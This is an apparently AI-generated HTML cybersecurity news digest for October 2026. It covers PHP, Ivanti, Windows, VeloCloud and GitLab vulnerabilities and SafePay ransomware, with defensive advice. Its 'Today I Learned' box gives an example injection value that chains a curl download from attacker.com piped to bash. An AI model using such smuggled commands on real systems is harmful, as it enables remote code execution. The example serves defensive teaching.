@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Cybersecurity News — Oct 24, 2026</title></head>
+<body style="font-family:Arial,sans-serif;max-width:660px;margin:0 auto;background:#f3f4f6;padding:16px;">
+
+<div style="margin-bottom:12px;">
+  <a href="../index.html" style="font-size:12px;color:#6b7280;text-decoration:none;">← All digests</a>
+</div>
+
+<!-- THREAT BANNER -->
+<div style="background:#dc2626;color:white;padding:16px 20px;border-radius:8px;margin-bottom:16px;">
+  <div style="font-size:11px;text-transform:uppercase;letter-spacing:1px;opacity:.85;">🔴 ELEVATED</div>
+  <div style="font-size:20px;font-weight:bold;margin-top:4px;">Cybersecurity News — Oct 24, 2026</div>
+  <div style="font-size:13px;opacity:.85;margin-top:4px;">8 stories · 3 critical · 3 high · 2 medium · ~8 min read</div>
+</div>
+
+<!-- STORY 1: PHP php2shell CRITICAL -->
+<div style="background:white;border-left:4px solid #dc2626;border-radius:4px;padding:14px 16px;margin-bottom:10px;box-shadow:0 1px 3px rgba(0,0,0,.07);">
+  <div style="margin-bottom:8px;">
+    <span style="background:#dc2626;color:white;font-size:11px;font-weight:bold;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+    <span style="font-size:12px;color:#6b7280;margin-left:8px;">Help Net Security · Oct 21, 2026</span>
+  </div>
+  <details>
+    <summary style="font-size:15px;font-weight:bold;color:#111827;cursor:pointer;list-style:none;"><a href="https://helpnetsecurity.com/2026/10/21/php2shell-php-vulnerabilities-patched-cve-2026-109618-cve-2026-109619" style="color:#111827;text-decoration:none;">PHP "php2shell" Zero-Days Actively Exploited — CVE-2026-109618 &amp; CVE-2026-109619 (CVSS 9.2)</a></summary>
+    <div style="margin-top:10px;font-size:13px;color:#374151;line-height:1.6;">
+      <div>🔍 <strong>What happened:</strong> Two critical RCE flaws in PHP's core (CVE-2026-109618 and CVE-2026-109619, CVSS 9.2 each) are being actively exploited in the wild — unauthenticated attackers can execute arbitrary code on any PHP-powered web server using a crafted HTTP request.</div>
+      <div style="margin-top:3px;">👤 <strong>Who's affected:</strong> Every organization running a PHP web server using mod_php, PHP-FPM, php-cgi, FrankenPHP, or LiteSpeed — which accounts for roughly 77% of all websites with a known server-side language.</div>
+      <div style="margin-top:3px;">✅ <strong>What to do:</strong> Immediately upgrade to PHP 8.5.12, 8.4.27, 8.3.36, or 8.2.35 — PHP states there is no configuration-only workaround and updating is the only safe fix.</div>
+    </div>
+    <div style="margin-top:10px;padding:8px 10px;background:#faf5ff;border-left:3px solid #7c3aed;border-radius:3px;font-size:12px;color:#374151;">
+      🎯 <strong style="color:#6d28d9;">ATT&CK:</strong> [Initial Access] T1190 · Exploit Public-Facing Application<br>
+      <span style="color:#6b7280;">Attackers are directly exploiting PHP web servers exposed to the internet, bypassing authentication entirely by crafting malicious HTTP requests that trigger the memory-corruption flaws before any authentication check runs.</span>
+    </div>
+    <details style="margin-top:10px;">
+      <summary style="font-size:13px;color:#4f46e5;cursor:pointer;font-weight:500;">▶ Full analysis &amp; beginner explanation</summary>
+      <div style="margin-top:10px;padding:12px;background:#f8fafc;border-radius:4px;font-size:13px;color:#374151;line-height:1.6;">
+        <p>CVE-2026-109618 stems from an out-of-memory condition that leaves HTTP request data partially initialized in PHP worker processes. A crafted request can cause the worker to treat uninitialized or attacker-controlled memory as trusted input, leading to arbitrary code execution. CVE-2026-109619 is a related stale-state bug: after one request triggers the corrupted state, a subsequent request handled by the same worker process can reuse that tainted data before normal initialization resets it.</p>
+        <p>Amazon Threat Intelligence logged exploitation attempts on October 17 — four days before public disclosure — and watchTowr confirmed detection in global honeypot networks shortly after. The exploitation requires no authentication credentials, no prior access, and works against default PHP configurations. Every deployment model (mod_php under Apache, PHP-FPM behind nginx, php-cgi, FrankenPHP) is vulnerable. PHP confirmed patches on October 21, but CISA noted it had not independently verified exploitation scope at advisory time.</p>
+        <p>Organizations should audit web server logs for unusual process-spawning activity and check for unexpected outbound network connections from PHP worker processes, which could indicate post-exploitation backdoor installation.</p>
+        <div style="margin-top:10px;padding:10px;background:#eff6ff;border-radius:4px;border-left:3px solid #3b82f6;">
+          <strong style="color:#1d4ed8;">🎓 For beginners:</strong> PHP is the programming language that powers a huge fraction of websites (WordPress, Laravel apps, and countless custom sites). These bugs are like finding that the mail-slot in a building's front door is big enough to reach the lock from outside — an attacker doesn't need a key (login credentials) to get in. They just send the building a weirdly-shaped envelope, and it opens the door itself.
+        </div>
+        <div style="margin-top:8px;font-size:12px;color:#6b7280;">CVE-2026-109618 / CVE-2026-109619 · CVSS: 9.2/10 — A near-maximum score reflecting unauthenticated exploitation with high impact across confidentiality, integrity, and availability on a ubiquitous platform.</div>
+      </div>
+    </details>
+  </details>
+</div>
+
+<!-- STORY 2: Ivanti Connect Secure CRITICAL -->
+<div style="background:white;border-left:4px solid #dc2626;border-radius:4px;padding:14px 16px;margin-bottom:10px;box-shadow:0 1px 3px rgba(0,0,0,.07);">
+  <div style="margin-bottom:8px;">
+    <span style="background:#dc2626;color:white;font-size:11px;font-weight:bold;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+    <span style="font-size:12px;color:#6b7280;margin-left:8px;">BleepingComputer · Oct 23, 2026</span>
+  </div>
+  <details>
+    <summary style="font-size:15px;font-weight:bold;color:#111827;cursor:pointer;list-style:none;"><a href="https://www.bleepingcomputer.com/news/security/ivanti-warns-of-connect-secure-zero-day-exploited-in-attacks/" style="color:#111827;text-decoration:none;">Ivanti Connect Secure Zero-Day Chain CVE-2026-104935 Gives Attackers Root on Fully Patched VPNs</a></summary>
+    <div style="margin-top:10px;font-size:13px;color:#374151;line-height:1.6;">
+      <div>🔍 <strong>What happened:</strong> Threat actor UTA0576 has been chaining three vulnerabilities in Ivanti Connect Secure since at least October 3 to achieve unauthenticated root-level code execution on fully patched VPN appliances — Ivanti patched the first two bugs (CVE-2026-104935) on October 13, but the third privilege-escalation flaw still has no patch.</div>
+      <div style="margin-top:3px;">👤 <strong>Who's affected:</strong> Organizations using Ivanti Connect Secure VPN appliances globally; CISA has ordered federal agencies to factory-reset compromised devices and restore from backup immediately.</div>
+      <div style="margin-top:3px;">✅ <strong>What to do:</strong> Apply Ivanti's October 13 patch for CVE-2026-104935, run Ivanti's Integrity Checker Tool, factory-reset any appliance that shows signs of compromise, and reset all credentials and certificates stored on or accessible through the device.</div>
+    </div>
+    <div style="margin-top:10px;padding:8px 10px;background:#faf5ff;border-left:3px solid #7c3aed;border-radius:3px;font-size:12px;color:#374151;">
+      🎯 <strong style="color:#6d28d9;">ATT&CK:</strong> [Discovery] T1046 · Network Service Discovery<br>
+      <span style="color:#6b7280;">After gaining root access, UTA0576 extensively queried Active Directory and LDAP to map the victim network, harvested LAPS passwords and BitLocker recovery keys, and captured LDAP data in preparation for lateral movement — classic post-exploitation reconnaissance.</span>
+    </div>
+    <details style="margin-top:10px;">
+      <summary style="font-size:13px;color:#4f46e5;cursor:pointer;font-weight:500;">▶ Full analysis &amp; beginner explanation</summary>
+      <div style="margin-top:10px;padding:12px;background:#f8fafc;border-radius:4px;font-size:13px;color:#374151;line-height:1.6;">
+        <p>Volexity's analysis reveals a sophisticated three-step exploit chain. The first two steps (CVE-2026-104935) combine an authentication bypass with a remote code execution flaw. The third step — still unpatched — escalates privileges to root by modifying the in-memory copy of a privileged Ivanti maintenance library, causing a scheduled task (dsinvoked) to execute attacker-controlled Perl code with root permissions.</p>
+        <p>What makes this particularly alarming is UTA0576's operational security: they deployed no malware or web shell, instead re-exploiting the device fresh for every command. The actor also tampered with logs to cover their tracks, successfully evading Ivanti's built-in Integrity Checker Tool — the very tool Ivanti recommends defenders use to detect compromise. Post-compromise, the group harvested credentials, LAPS passwords, BitLocker recovery keys, and LDAP data.</p>
+        <p>CISA added CVE-2026-104935 to its Known Exploited Vulnerabilities catalog on October 13. Because one flaw in the chain remains unpatched, patching alone is insufficient — affected organizations must treat any Ivanti Connect Secure appliance as potentially compromised and follow CISA's factory-reset guidance.</p>
+        <div style="margin-top:10px;padding:10px;background:#eff6ff;border-radius:4px;border-left:3px solid #3b82f6;">
+          <strong style="color:#1d4ed8;">🎓 For beginners:</strong> A VPN appliance is the front door your remote employees use to access company systems from home. This attack lets hackers sneak in through that door without needing a password, and then go completely silent — instead of leaving a listening program running (which security tools would detect), they quietly re-pick the lock every time they need to do something, making them almost invisible.
+        </div>
+        <div style="margin-top:8px;font-size:12px;color:#6b7280;">CVE-2026-104935 · CVSS: 9.1/10 — Critical score reflecting unauthenticated exploit against widely deployed perimeter VPN infrastructure with active exploitation confirmed.</div>
+      </div>
+    </details>
+  </details>
+</div>
+
+<!-- THREAT ACTOR: UTA0576 -->
+<div style="background:#1e1b4b;color:white;border-radius:4px;padding:12px 16px;margin-top:-6px;margin-bottom:10px;font-size:13px;">
+  <div style="font-size:11px;text-transform:uppercase;letter-spacing:1px;opacity:.7;margin-bottom:6px;">⚠ Threat Actor</div>
+  <div style="font-weight:bold;font-size:15px;">UTA0576</div>
+  <div style="opacity:.85;margin-top:4px;">Espionage Cluster · Attribution: Unknown (likely nation-state)</div>
+  <div style="margin-top:8px;">🎯 <strong>Targets:</strong> Enterprise VPN infrastructure (Ivanti Connect Secure), credential stores, Active Directory environments</div>
+  <div style="margin-top:3px;">🔧 <strong>Known for:</strong> Highly sophisticated zero-day exploit chains, log-tampering to evade integrity checkers, fileless post-exploitation using re-exploitation rather than persistent implants, credential and BitLocker key harvesting</div>
+</div>
+
+<!-- STORY 3: Microsoft Patch Tuesday CRITICAL -->
+<div style="background:white;border-left:4px solid #dc2626;border-radius:4px;padding:14px 16px;margin-bottom:10px;box-shadow:0 1px 3px rgba(0,0,0,.07);">
+  <div style="margin-bottom:8px;">
+    <span style="background:#dc2626;color:white;font-size:11px;font-weight:bold;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+    <span style="font-size:12px;color:#6b7280;margin-left:8px;">BleepingComputer · Oct 14, 2026</span>
+  </div>
+  <details>
+    <summary style="font-size:15px;font-weight:bold;color:#111827;cursor:pointer;list-style:none;"><a href="https://www.bleepingcomputer.com/news/microsoft/microsoft-october-2026-patch-tuesday-fixes-1-411-flaws-3-zero-days/" style="color:#111827;text-decoration:none;">Microsoft October 2026 Patch Tuesday: Record 1,413 CVEs — Windows Shell Zero-Day CVE-2026-96951 Under Active Attack</a></summary>
+    <div style="margin-top:10px;font-size:13px;color:#374151;line-height:1.6;">
+      <div>🔍 <strong>What happened:</strong> Microsoft's October Patch Tuesday fixes a record 1,413 CVEs including CVE-2026-96951 (CVSS 8.8), a Windows Shell security feature bypass actively exploited in the wild that enables Mark-of-the-Web bypass — letting attackers run malicious files that Windows would otherwise block as untrusted downloads.</div>
+      <div style="margin-top:3px;">👤 <strong>Who's affected:</strong> All Windows users and organizations running unpatched systems; additionally, two critical Outlook RCEs (CVE-2026-70242, CVE-2026-97016, CVSS 9.8 each) put every Microsoft 365 mail user at risk if left unpatched.</div>
+      <div style="margin-top:3px;">✅ <strong>What to do:</strong> Apply the October 2026 Windows cumulative update immediately — CISA's federal remediation deadline for CVE-2026-96951 was October 16; prioritize Outlook and Windows Shell patches in enterprise environments.</div>
+    </div>
+    <div style="margin-top:10px;padding:8px 10px;background:#faf5ff;border-left:3px solid #7c3aed;border-radius:3px;font-size:12px;color:#374151;">
+      🎯 <strong style="color:#6d28d9;">ATT&CK:</strong> [Defense Evasion] T1553.005 · Subvert Trust Controls: Mark-of-the-Web Bypass<br>
+      <span style="color:#6b7280;">CVE-2026-96951 allows attackers to strip or bypass the MotW security tag from downloaded files, making malicious executables appear locally trusted — a critical first step in phishing and drive-by-download campaigns that evades Windows SmartScreen and macro-execution restrictions.</span>
+    </div>
+    <details style="margin-top:10px;">
+      <summary style="font-size:13px;color:#4f46e5;cursor:pointer;font-weight:500;">▶ Full analysis &amp; beginner explanation</summary>
+      <div style="margin-top:10px;padding:12px;background:#f8fafc;border-radius:4px;font-size:13px;color:#374151;line-height:1.6;">
+        <p>October 2026 marks Microsoft's largest-ever Patch Tuesday with totals ranging from 1,411 to 1,413 CVEs depending on counting methodology. The single actively exploited zero-day, CVE-2026-96951, is the third Windows Shell MotW bypass patched this year — following CVE-2026-21510 and CVE-2026-32202. CISA added it to its KEV catalog with a federal remediation deadline of October 16, though no attribution or attack-chain details have been disclosed publicly.</p>
+        <p>Beyond the zero-day, two Outlook remote code execution bugs stand out: CVE-2026-70242 and CVE-2026-97016, both rated CVSS 9.8. These are particularly dangerous because Outlook RCEs can be triggered before a victim opens an email (preview-pane exploitation), making them candidates for worm-like lateral movement across organizations. Neither is confirmed exploited yet, but their severity warrants immediate prioritization.</p>
+        <p>The record CVE count reflects Microsoft's continued expansion of its security update scope to include third-party and non-Windows components in the monthly rollup. Defenders should use vulnerability management tools to prioritize the 95 CVSS Critical-rated items in this release alongside the three disclosed zero-days.</p>
+        <div style="margin-top:10px;padding:10px;background:#eff6ff;border-radius:4px;border-left:3px solid #3b82f6;">
+          <strong style="color:#1d4ed8;">🎓 For beginners:</strong> When you download a file from the internet, Windows secretly stamps it with an invisible "downloaded from internet" tag. This tag makes Windows extra cautious — it warns you before running the file. The exploited bug lets attackers remove that stamp, so Windows treats their malicious program like a safe, local file you created yourself — no warnings, no blocks.
+        </div>
+        <div style="margin-top:8px;font-size:12px;color:#6b7280;">CVE-2026-96951 · CVSS: 8.8/10 — High score reflecting active exploitation of a widely-deployed Windows feature that directly weakens a key defense-in-depth control against malware delivery.</div>
+      </div>
+    </details>
+  </details>
+</div>
+
+<!-- STORY 4: Arista VeloCloud HIGH -->
+<div style="background:white;border-left:4px solid #ea580c;border-radius:4px;padding:14px 16px;margin-bottom:10px;box-shadow:0 1px 3px rgba(0,0,0,.07);">
+  <div style="margin-bottom:8px;">
+    <span style="background:#ea580c;color:white;font-size:11px;font-weight:bold;padding:2px 8px;border-radius:3px;">HIGH</span>
+    <span style="font-size:12px;color:#6b7280;margin-left:8px;">SecurityWeek · Oct 23, 2026</span>
+  </div>
+  <details>
+    <summary style="font-size:15px;font-weight:bold;color:#111827;cursor:pointer;list-style:none;"><a href="https://www.securityweek.com/attackers-exploit-third-velocloud-orchestrator-zero-day-in-four-months/" style="color:#111827;text-decoration:none;">Attackers Exploit Third Arista VeloCloud Orchestrator Zero-Day in Four Months — CVE-2026-16812 (CVSS 10.0)</a></summary>
+    <div style="margin-top:10px;font-size:13px;color:#374151;line-height:1.6;">
+      <div>🔍 <strong>What happened:</strong> A maximum-severity OS command injection zero-day (CVE-2026-16812, CVSS 10.0) in Arista's VeloCloud Orchestrator SD-WAN management platform is being actively exploited — unauthenticated remote attackers can reach privileged internal API functionality never intended to be externally accessible.</div>
+      <div style="margin-top:3px;">👤 <strong>Who's affected:</strong> Enterprises using on-premises VeloCloud Orchestrator deployments for SD-WAN management; this is the third zero-day exploited in the platform within four months, indicating persistent attacker interest.</div>
+      <div style="margin-top:3px;">✅ <strong>What to do:</strong> Apply Arista's emergency patch immediately; if patching is not immediately possible, restrict external access to the VCO management interface and audit for signs of compromise.</div>
+    </div>
+    <div style="margin-top:10px;padding:8px 10px;background:#faf5ff;border-left:3px solid #7c3aed;border-radius:3px;font-size:12px;color:#374151;">
+      🎯 <strong style="color:#6d28d9;">ATT&CK:</strong> [Execution] T1059.004 · Command and Scripting Interpreter: Unix Shell<br>
+      <span style="color:#6b7280;">The OS command injection flaw in VeloCloud Orchestrator allows attackers to inject Unix shell commands via the exposed API endpoint, giving them direct OS-level code execution on the underlying Linux host without needing to bypass any additional security controls.</span>
+    </div>
+    <details style="margin-top:10px;">
+      <summary style="font-size:13px;color:#4f46e5;cursor:pointer;font-weight:500;">▶ Full analysis &amp; beginner explanation</summary>
+      <div style="margin-top:10px;padding:12px;background:#f8fafc;border-radius:4px;font-size:13px;color:#374151;line-height:1.6;">
+        <p>CVE-2026-16812 carries a perfect CVSS 10.0 score, reflecting maximum severity across all measurement dimensions: unauthenticated access, network-reachable, no user interaction required, and full system compromise upon exploitation. The vulnerability exists in a privileged internal API pathway in VeloCloud Orchestrator On-Prem that was never designed to be internet-exposed but became reachable due to an access control oversight.</p>
+        <p>This is the third VeloCloud Orchestrator zero-day in four months, a pattern suggesting either sustained targeted research by a specific threat group, or that the platform has structural security weaknesses driving ongoing vulnerability discovery. The rapid succession of exploitable flaws in SD-WAN management platforms is particularly concerning because these systems serve as the brain of enterprise WAN infrastructure — compromise can enable attackers to redirect traffic, intercept communications, or move laterally to every branch office simultaneously.</p>
+        <div style="margin-top:10px;padding:10px;background:#eff6ff;border-radius:4px;border-left:3px solid #3b82f6;">
+          <strong style="color:#1d4ed8;">🎓 For beginners:</strong> OS Command Injection is like finding that a website's search box will execute whatever you type as a direct computer command. Instead of searching for "shoes," an attacker types "delete all files" — and the server actually does it. VeloCloud Orchestrator manages the networking for hundreds of company offices simultaneously, so compromising it is like getting the master keys to every branch.
+        </div>
+        <div style="margin-top:8px;font-size:12px;color:#6b7280;">CVE-2026-16812 · CVSS: 10.0/10 — Maximum score; unauthenticated remote OS command injection on enterprise SD-WAN management infrastructure with confirmed active exploitation.</div>
+      </div>
+    </details>
+  </details>
+</div>
+
+<!-- STORY 5: SafePay Ransomware HIGH -->
+<div style="background:white;border-left:4px solid #ea580c;border-radius:4px;padding:14px 16px;margin-bottom:10px;box-shadow:0 1px 3px rgba(0,0,0,.07);">
+  <div style="margin-bottom:8px;">
+    <span style="background:#ea580c;color:white;font-size:11px;font-weight:bold;padding:2px 8px;border-radius:3px;">HIGH</span>
+    <span style="font-size:12px;color:#6b7280;margin-left:8px;">CISA / BleepingComputer · Oct 20, 2026</span>
+  </div>
+  <details>
+    <summary style="font-size:15px;font-weight:bold;color:#111827;cursor:pointer;list-style:none;"><a href="https://bleepingcomputer.com/news/security/cisa-and-fbi-safepay-ransomware-has-hit-over-600-critical-infrastructure-organizations" style="color:#111827;text-decoration:none;">FBI &amp; CISA Joint Advisory: SafePay Ransomware Has Hit 600+ Critical Infrastructure Organizations Worldwide</a></summary>
+    <div style="margin-top:10px;font-size:13px;color:#374151;line-height:1.6;">
+      <div>🔍 <strong>What happened:</strong> CISA, FBI, U.S. Secret Service, and international partners (UK NCA, Germany BKA) released joint advisory AA26-293A warning that SafePay ransomware has breached over 600 critical infrastructure organizations globally since 2024, with 15–30 new victims per month throughout 2026.</div>
+      <div style="margin-top:3px;">👤 <strong>Who's affected:</strong> Critical infrastructure operators across North America, South America, Europe, and Australia — including healthcare, manufacturing, and government entities; SafePay was behind the Conduent breach settled in 2025.</div>
+      <div style="margin-top:3px;">✅ <strong>What to do:</strong> Review advisory AA26-293A for SafePay's IoCs and TTPs; enforce MFA on all VPN and internet-facing services, patch internet-facing vulnerabilities promptly, and maintain offline backups tested for recovery.</div>
+    </div>
+    <div style="margin-top:10px;padding:8px 10px;background:#faf5ff;border-left:3px solid #7c3aed;border-radius:3px;font-size:12px;color:#374151;">
+      🎯 <strong style="color:#6d28d9;">ATT&CK:</strong> [Impact] T1486 · Data Encrypted for Impact<br>
+      <span style="color:#6b7280;">SafePay's ransomware operation encrypts victim files after data exfiltration to maximize leverage in double-extortion demands — the advisory specifically highlights their use of VPN services and internet-facing devices for initial access before deploying encryption.</span>
+    </div>
+    <details style="margin-top:10px;">
+      <summary style="font-size:13px;color:#4f46e5;cursor:pointer;font-weight:500;">▶ Full analysis &amp; beginner explanation</summary>
+      <div style="margin-top:10px;padding:12px;background:#f8fafc;border-radius:4px;font-size:13px;color:#374151;line-height:1.6;">
+        <p>The joint advisory AA26-293A marks a significant escalation in law enforcement attention to SafePay, which has maintained an unusually consistent operational tempo — roughly 15–30 new victims per month throughout 2026. Unlike some ransomware groups that show spikes and lulls tied to law enforcement pressure, SafePay's steady cadence suggests a disciplined, business-like operation with stable infrastructure and operator continuity.</p>
+        <p>SafePay's initial access methodology centers on exploiting VPN services and other internet-facing systems, which aligns with the broader trend of ransomware groups prioritizing perimeter device exploitation over phishing. This makes the concurrent zero-days in Ivanti Connect Secure and Arista VeloCloud particularly concerning — organizations that delay patching these products are directly in SafePay's targeting profile.</p>
+        <p>Authorities are explicit that paying ransoms does not guarantee file recovery and may fund further criminal activity. Victims are urged to report incidents to the FBI's IC3 portal, which helps law enforcement map the group's infrastructure for potential takedown operations.</p>
+        <div style="margin-top:10px;padding:10px;background:#eff6ff;border-radius:4px;border-left:3px solid #3b82f6;">
+          <strong style="color:#1d4ed8;">🎓 For beginners:</strong> SafePay ransomware locks all your files with a digital padlock only they have the key to, then demands payment to unlock them — and also threatens to publish your stolen data if you don't pay (this is called "double extortion"). With 600 victims and still going at 15–30 new breaches per month, this is an active, industrial-scale criminal operation.
+        </div>
+      </div>
+    </details>
+  </details>
+</div>
+
+<!-- THREAT ACTOR: SafePay -->
+<div style="background:#1e1b4b;color:white;border-radius:4px;padding:12px 16px;margin-top:-6px;margin-bottom:10px;font-size:13px;">
+  <div style="font-size:11px;text-transform:uppercase;letter-spacing:1px;opacity:.7;margin-bottom:6px;">⚠ Threat Actor</div>
+  <div style="font-weight:bold;font-size:15px;">SafePay</div>
+  <div style="opacity:.85;margin-top:4px;">Ransomware-as-a-Service Gang · Attribution: Criminal (origin unknown)</div>
+  <div style="margin-top:8px;">🎯 <strong>Targets:</strong> Critical infrastructure worldwide — healthcare, manufacturing, government, business services; active across NA, South America, Europe, Australia</div>
+  <div style="margin-top:3px;">🔧 <strong>Known for:</strong> Double-extortion ransomware (encrypt + steal), consistent 15–30 victims/month in 2026, VPN exploitation for initial access, behind the 2024 Conduent breach</div>
+</div>
+
+<!-- STORY 6: GitLab RCE HIGH -->
+<div style="background:white;border-left:4px solid #ea580c;border-radius:4px;padding:14px 16px;margin-bottom:10px;box-shadow:0 1px 3px rgba(0,0,0,.07);">
+  <div style="margin-bottom:8px;">
+    <span style="background:#ea580c;color:white;font-size:11px;font-weight:bold;padding:2px 8px;border-radius:3px;">HIGH</span>
+    <span style="font-size:12px;color:#6b7280;margin-left:8px;">Help Net Security · Oct 13, 2026</span>
+  </div>
+  <details>
+    <summary style="font-size:15px;font-weight:bold;color:#111827;cursor:pointer;list-style:none;"><a href="https://helpnetsecurity.com/2026/10/13/gitlab-ci-cd-regular-expression-compiler-vulnerability-cve-2026-97229" style="color:#111827;text-decoration:none;">GitLab Critical RCE CVE-2026-97229 (CVSS 10.0) — Unauthenticated Code Execution via Regex Compiler Integer Overflow</a></summary>
+    <div style="margin-top:10px;font-size:13px;color:#374151;line-height:1.6;">
+      <div>🔍 <strong>What happened:</strong> GitLab patched a CVSS 10.0 integer overflow in its CI/CD Regular Expression Compiler (CVE-2026-97229) that lets unauthenticated attackers execute code on self-hosted GitLab servers by submitting a crafted regex pattern in a CI/CD configuration.</div>
+      <div style="margin-top:3px;">👤 <strong>Who's affected:</strong> Self-managed GitLab CE and EE installations on versions 19.2.x before 19.2.8, 19.3.x before 19.3.5, and 19.4.x before 19.4.2; GitLab.com and GitLab Dedicated are already protected.</div>
+      <div style="margin-top:3px;">✅ <strong>What to do:</strong> Upgrade to GitLab CE/EE 19.4.2, 19.3.5, or 19.2.8 immediately; no active exploitation has been confirmed but a Rapid7 proof-of-concept analysis has been published.</div>
+    </div>
+    <div style="margin-top:10px;padding:8px 10px;background:#faf5ff;border-left:3px solid #7c3aed;border-radius:3px;font-size:12px;color:#374151;">
+      🎯 <strong style="color:#6d28d9;">ATT&CK:</strong> [Initial Access] T1190 · Exploit Public-Facing Application<br>
+      <span style="color:#6b7280;">An unauthenticated attacker exploiting this flaw gains code execution on the GitLab server itself — providing direct access to source code repositories, CI/CD secrets, deployment keys, and potentially the ability to poison software builds, making this a potential supply-chain entry point.</span>
+    </div>
+    <details style="margin-top:10px;">
+      <summary style="font-size:13px;color:#4f46e5;cursor:pointer;font-weight:500;">▶ Full analysis &amp; beginner explanation</summary>
+      <div style="margin-top:10px;padding:12px;background:#f8fafc;border-radius:4px;font-size:13px;color:#374151;line-height:1.6;">
+        <p>CVE-2026-97229 is an integer overflow (CWE-190) in GitLab's Regular Expression Compiler used during CI/CD pipeline processing. When GitLab compiles a sufficiently crafted regex from a .gitlab-ci.yml file, the integer overflow corrupts adjacent memory and can redirect execution to attacker-controlled code. The flaw requires the attacker to have write access to a public project — or any account on the self-hosted server — but researchers note the pre-authentication attack surface may be wider in certain configurations.</p>
+        <p>A GitLab server compromise is particularly high-value because it sits at the center of software development pipelines: source code, deployment keys, container registry credentials, API tokens, and CI/CD environment variables are all accessible from a compromised GitLab instance. Attackers who breach a GitLab server can potentially modify code before it's deployed to production, creating a supply-chain attack affecting end users of that organization's software.</p>
+        <div style="margin-top:10px;padding:10px;background:#eff6ff;border-radius:4px;border-left:3px solid #3b82f6;">
+          <strong style="color:#1d4ed8;">🎓 For beginners:</strong> GitLab is where software developers store their code and automate the process of testing and releasing it. Breaking into a GitLab server is like breaking into the factory that makes a product — not only do you steal everything inside, you can also secretly change what comes off the assembly line before it reaches customers.
+        </div>
+        <div style="margin-top:8px;font-size:12px;color:#6b7280;">CVE-2026-97229 · CVSS: 10.0/10 — Maximum severity; unauthenticated integer overflow enabling RCE on critical software development infrastructure.</div>
+      </div>
+    </details>
+  </details>
+</div>
+
+<!-- TODAY I LEARNED -->
+<details style="background:white;border-radius:8px;padding:14px 16px;margin-bottom:10px;box-shadow:0 1px 3px rgba(0,0,0,.07);">
+  <summary style="font-size:15px;font-weight:bold;color:#111827;cursor:pointer;">💡 Today I Learned: OS Command Injection ▶</summary>
+  <div style="margin-top:10px;padding:12px;background:#f0fdf4;border-radius:4px;font-size:13px;color:#374151;line-height:1.6;">
+    OS Command Injection is a vulnerability where an application passes unsanitized user-supplied data directly to an operating system command interpreter (like bash or cmd.exe), allowing an attacker to append their own commands — for example, a web form that accepts a filename for processing might be abused by submitting <code>report.pdf; curl attacker.com/backdoor | bash</code> instead. Today's Arista VeloCloud CVE-2026-16812 is a textbook example: the VCO management API passed external input into an OS command without stripping special shell characters, giving any unauthenticated internet user root access to the underlying Linux server. The fix is always the same — never pass external input to shell functions, and where you must interact with the OS, use parameterized API calls or allow-list validation that rejects anything not on a pre-approved safe list.
+  </div>
+</details>
+
+<!-- GLOSSARY -->
+<details style="background:white;border-radius:8px;padding:14px 16px;margin-bottom:10px;box-shadow:0 1px 3px rgba(0,0,0,.07);">
+  <summary style="font-size:15px;font-weight:bold;color:#111827;cursor:pointer;">📖 Glossary: PHP-FPM · LDAP · MotW · Active Directory · VCO ▶</summary>
+  <div style="margin-top:10px;">
+    <div style="padding:7px 0;border-bottom:1px solid #f3f4f6;font-size:13px;">
+      <strong style="color:#111827;">PHP-FPM</strong> — PHP FastCGI Process Manager; runs PHP web applications as a pool of persistent worker processes that handle HTTP requests in parallel, improving performance over the older CGI model.
+    </div>
+    <div style="padding:7px 0;border-bottom:1px solid #f3f4f6;font-size:13px;">
+      <strong style="color:#111827;">LDAP</strong> — Lightweight Directory Access Protocol; a protocol for querying and modifying directory services like Active Directory, used to look up user accounts, group memberships, and access permissions across an enterprise network.
+    </div>
+    <div style="padding:7px 0;border-bottom:1px solid #f3f4f6;font-size:13px;">
+      <strong style="color:#111827;">MotW</strong> — Mark of the Web; a hidden Windows metadata tag automatically added to files downloaded from the internet that triggers SmartScreen security warnings and prevents Office macros from running — bypassing it makes malicious files appear locally trusted.
+    </div>
+    <div style="padding:7px 0;border-bottom:1px solid #f3f4f6;font-size:13px;">
+      <strong style="color:#111827;">Active Directory</strong> — Microsoft's central directory service for managing users, computers, and permissions on a Windows enterprise network; a prime post-compromise target because controlling it gives attackers access to all systems in an organization.
+    </div>
+    <div style="padding:7px 0;font-size:13px;">
+      <strong style="color:#111827;">VCO</strong> — VeloCloud Orchestrator; Arista's SD-WAN management platform that centralizes configuration, monitoring, and policy enforcement for enterprise WAN edge devices across all branch offices.
+    </div>
+  </div>
+</details>
+
+<!-- ALSO TODAY -->
+<div style="background:white;border-radius:8px;padding:14px 16px;margin-bottom:10px;box-shadow:0 1px 3px rgba(0,0,0,.07);">
+  <div style="font-size:15px;font-weight:bold;color:#111827;margin-bottom:10px;">Also Today</div>
+
+  <div style="padding:6px 0;border-bottom:1px solid #f3f4f6;font-size:13px;">
+    <span style="background:#ca8a04;color:white;font-size:10px;font-weight:bold;padding:1px 6px;border-radius:2px;margin-right:6px;">MEDIUM</span>
+    <a href="https://www.itsecuritynews.info/connectwise-backup-app-breaches-173-microsoft-tenants-chinese-spies-exploit-beyondtrust-zero-day-japan-declares-first-cyber-state-of-emergency/" style="color:#374151;text-decoration:none;">ConnectWise Backup App Supply-Chain Breach Hits 173 Microsoft 365 Tenants — Storm-0940 Linked</a>
+    <span style="color:#9ca3af;font-size:11px;"> · IT Security News</span>
+  </div>
+
+  <div style="padding:6px 0;font-size:13px;">
+    <span style="background:#ca8a04;color:white;font-size:10px;font-weight:bold;padding:1px 6px;border-radius:2px;margin-right:6px;">MEDIUM</span>
+    <a href="https://www.helpnetsecurity.com/2026/09/28/citrix-netscaler-rce-zero-days-exploited-for-weeks-cve-2026-88771-cve-2026-88772/" style="color:#374151;text-decoration:none;">Citrix NetScaler ADC/Gateway CVE-2026-88771 &amp; CVE-2026-88772 Exploitation Continues — Webshells and Log Poisoning Confirmed</a>
+    <span style="color:#9ca3af;font-size:11px;"> · Help Net Security</span>
+  </div>
+</div>
+
+<div style="text-align:center;font-size:11px;color:#9ca3af;padding:16px 0;">
+  Generated by Claude · 10 feeds monitored · Oct 24, 2026 · <a href="../index.html" style="color:#9ca3af;">All digests</a>
+</div>
+
+</body>
+</html>
